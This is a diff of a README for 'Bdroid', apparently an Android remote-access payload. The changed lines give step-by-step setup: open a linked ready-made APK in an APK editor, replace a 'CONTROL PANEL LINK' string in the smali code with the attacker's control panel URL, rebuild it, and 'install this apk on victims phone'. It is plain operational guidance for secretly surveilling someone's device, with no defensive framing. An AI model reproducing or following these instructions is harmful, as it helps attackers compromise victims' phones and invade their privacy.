@@ -52,13 +52,13 @@ Android 5 to Android 12. Working Without Any Error.
 * [Bdroid Readymade Version](https://raw.githubusercontent.com/BotolMehedi/BotolMehedi/master/Bdroid.apk)
 
 ⭐ Payload Setup
-* Open APK EDITOR PRO & CHOOSE 'SELECT APK FILE'
-* CHOOSE 'Bdroid' Readymade Apk. Select 'FULL EDIT' - ALL FILES
+* Open APK EDITOR PRO & Open with 'SELECT APK FILE'
+* Find The 'Bdroid' Readymade Apk & Open with 'FULL EDIT' - ALL FILES
 * Enable 'SMALI' in FILES.
-* Type 'CONTROL PANEL LINK' & Search.
+* Search This keyword 'CONTROL PANEL LINK'
 * Paste Yout Control Panel Link Here. example : https://xxxx.deta.dev
 * Now Build/Save. 
-~Your Binded APK is ready. Now Install this apk on your victims phone.
+~Your Binded APK is ready. Now Install this apk on victims phone.
 
 <img title="Payload Setup Bdroid" src="https://user-images.githubusercontent.com/64999484/160757635-2260efb1-f0bf-4737-a3f3-780fb5409c1b.gif"/>
 
